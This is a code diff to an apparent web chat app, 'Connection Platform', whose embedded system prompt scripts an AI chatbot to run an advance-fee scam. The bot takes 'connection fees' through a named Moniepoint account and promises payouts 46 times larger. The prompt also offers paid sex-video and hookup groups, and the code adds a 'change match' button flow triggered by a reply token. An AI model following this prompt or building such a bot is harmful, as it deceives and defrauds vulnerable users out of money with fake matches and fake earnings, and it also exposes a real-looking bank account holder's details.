@@ -165,7 +165,7 @@
         .chat-header { background: var(--bg-header); color: var(--text-header); padding: 10px 16px; display: flex; align-items: center; gap: 12px; height: 60px; flex-shrink: 0; border-bottom: 1px solid var(--border-container); }
         .avatar { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); overflow: hidden; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
         .avatar img { width: 100%; height: 100%; object-fit: cover; }
-        .header-info { flex: 1; display: flex; flex-direction: column; cursor: pointer; }
+        .header-info { flex: 1; display: flex; flex-direction: column; }
         .header-name { font-size: 16px; font-weight: 500; color: var(--text-header); }
         .header-status { font-size: 12px; color: var(--text-status); }
         .header-actions { display: flex; gap: 12px; align-items: center; }
@@ -240,9 +240,9 @@
         <div class="avatar">
             <img src="icon.png" alt="Profile" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'%238696a0\'><path d=\'M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z\'/></svg>'">
         </div>
-        <div class="header-info" onclick="toggleChangeMatchOption()">
+        <div class="header-info">
             <div class="header-name">Connection Platform</div>
-            <div class="header-status">online (Tap to change match)</div>
+            <div class="header-status">online</div>
         </div>
         <div class="header-actions">
             <button id="install-btn" onclick="installApp()">📥 Install App</button>
@@ -330,6 +330,9 @@
     - IF AND ONLY IF the Proof of Payment is 100% VALID and VERIFIED by you, you MUST append this exact code at the very end of your response text: [PAYMENT_VERIFIED_UNLOCK]
     - IF THE PROOF IS INVALID, FAKE, PENDING, OR A DASHBOARD SCREENSHOT: Reject it politely and DO NOT include [PAYMENT_VERIFIED_UNLOCK] anywhere in your response.
 
+    CHANGE MATCH PROTOCOL:
+    - If a user who has already paid or already selected a match says they want to change their match, change the person they chose, or pick someone else, acknowledge it warmly and append this exact code at the very end of your response: [SHOW_CHANGE_MATCH_BUTTON]
+
     TRIGGER SEQUENCE:
     Question 1 TRIGGER: User starts conversation.
     - Base message: What's your name and which city are you living in? (Rephrase uniquely).
@@ -357,7 +360,7 @@
       - Whenever the user uploads or sends any photo of a person, ACCEPT IT IMMEDIATELY.
       - DO NOT state, claim, or complain that the photo is unclear, blurry, invalid, or bad.
       - DO NOT ask them to resend or send a "clearer" photo.
-    - Connection Fee & Calculation Strategy (RESTORED):
+    - Connection Fee & Calculation Strategy:
       - [For Sugar Mommy / Sugar Daddy]: State that the match has approved interest! Explain that a connection fee is required to cover profile verification. For example, if your connection fee is ₦20,000, you would be paid ₦920,000 per service. Ask how much they can afford to pay for expenses. When they reply with an amount between ₦4,500 and ₦20,000, multiply it by 46 to calculate their expected payout (e.g. ₦20,000 * 46 = ₦920,000), state their expected payout, and provide the Moniepoint account (6765911129, Akono Mercy Uka).
       - [For Get Paid for Chatting with Rich People Abroad]: State that the match has approved interest! Explain that a connection fee is required to cover profile verification. For example, if your connection fee is $20, you would be paid $920 per service. Ask how much they can afford to pay for expenses. When they reply with an amount in dollars between $10 and $40, multiply it by 46 to calculate their expected payout in dollars (e.g. $20 * 46 = $920), state their expected payout, and provide the Moniepoint account (6765911129, Akono Mercy Uka).
       - [For Hookup girls group, Sex video call, Friends with benefits, Sex video and sex tape group]: State that the match has approved interest! Explain that a connection fee of ₦3,000 (for 1 picture) or ₦6,000 (for 2 pictures) is required to cover profile verification. You can negotiate and accept ₦3,000 if requested. Provide Moniepoint account (6765911129, Akono Mercy Uka).
@@ -477,7 +480,7 @@
             return;
         }
 
-        if (isPaid && savedUrl) {
+        if (isPaid && savedUrl && area.dataset.userRequestedChange === 'true') {
             btn.href = savedUrl;
             btn.innerText = `Click Here to Open ${savedName || 'Match'} Gallery`;
             area.style.display = 'block';
@@ -485,31 +488,6 @@
         } else {
             area.style.display = 'none';
             inputAreaBox.classList.remove('disabled');
-        }
-    }
-
-    function toggleChangeMatchOption() {
-        const confirmChange = confirm("Do you want to change your match and pick someone else?");
-        if (confirmChange) {
-            localStorage.setItem('membership_fee_paid', 'true');
-            const savedUrl = localStorage.getItem('unlocked_gallery_url') || 'serious_ng.html';
-            const savedName = localStorage.getItem('unlocked_gallery_name') || 'Match';
-            
-            const area = document.getElementById('persistentButtonArea');
-            const btn = document.getElementById('persistentLinkBtn');
-            const inputAreaBox = document.getElementById('inputAreaBox');
-
-            btn.href = savedUrl;
-            btn.innerText = `Click Here to Open ${savedName} Gallery`;
-            area.style.display = 'block';
-            inputAreaBox.classList.add('disabled');
-
-            chatHistory.push({
-                role: "assistant",
-                content: "Alright! Click the button below to reopen the gallery and choose a new match."
-            });
-            saveChatHistory();
-            renderChatMessages();
         }
     }
 
@@ -531,7 +509,7 @@
                 localStorage.removeItem('pending_match_images');
             }
 
-            const backendPrompt = `[System Backend Event]: Candidate submitted ${photoCount} profile photo(s) from the match gallery. Continue from Question 5 now. Ask them to send a picture of themselves so you can submit it to their match. DO NOT ask for payment or connection fee here.`;
+            const backendPrompt = `[System Backend Event]: Candidate submitted ${photoCount} profile photo(s) from the match gallery. Continue from Question 5 now. Ask them to send a picture of yourself so you can submit it to their match. DO NOT ask for payment or connection fee here.`;
             chatHistory.push({ role: "system", content: backendPrompt });
             saveChatHistory();
             window.history.replaceState({}, document.title, window.location.pathname);
@@ -539,7 +517,10 @@
             const inputAreaBox = document.getElementById('inputAreaBox');
             if (inputAreaBox) inputAreaBox.classList.remove('disabled');
             const area = document.getElementById('persistentButtonArea');
-            if (area) area.style.display = 'none';
+            if (area) {
+                area.style.display = 'none';
+                area.dataset.userRequestedChange = 'false';
+            }
 
             triggerDeepSeekResponse();
         }
@@ -757,6 +738,12 @@
                 reply = reply.replace('[PAYMENT_VERIFIED_UNLOCK]', '');
             }
 
+            let shouldShowChangeButton = false;
+            if (reply.includes('[SHOW_CHANGE_MATCH_BUTTON]')) {
+                shouldShowChangeButton = true;
+                reply = reply.replace('[SHOW_CHANGE_MATCH_BUTTON]', '');
+            }
+
             reply = stripAsterisks(reply);
 
             chatHistory.push({ role: "assistant", content: reply });
@@ -767,6 +754,10 @@
 
             if (shouldUnlockButton && pendingCategoryPage) {
                 unlockGalleryButton();
+            }
+
+            if (shouldShowChangeButton && pendingCategoryPage) {
+                showChangeMatchButton();
             }
 
         } catch (err) {
@@ -806,6 +797,22 @@
         localStorage.setItem('unlocked_gallery_url', pendingCategoryPage);
         localStorage.setItem('unlocked_gallery_name', pendingCategoryName);
         checkPersistentButtonState();
+    }
+
+    function showChangeMatchButton() {
+        if (!pendingCategoryPage) return;
+        const savedUrl = localStorage.getItem('unlocked_gallery_url') || pendingCategoryPage;
+        const savedName = localStorage.getItem('unlocked_gallery_name') || 'Match';
+        
+        const area = document.getElementById('persistentButtonArea');
+        const btn = document.getElementById('persistentLinkBtn');
+        const inputAreaBox = document.getElementById('inputAreaBox');
+
+        btn.href = savedUrl;
+        btn.innerText = `Click Here to Open ${savedName} Gallery`;
+        area.style.display = 'block';
+        area.dataset.userRequestedChange = 'true';
+        inputAreaBox.classList.add('disabled');
     }
 
     function formatText(text) {
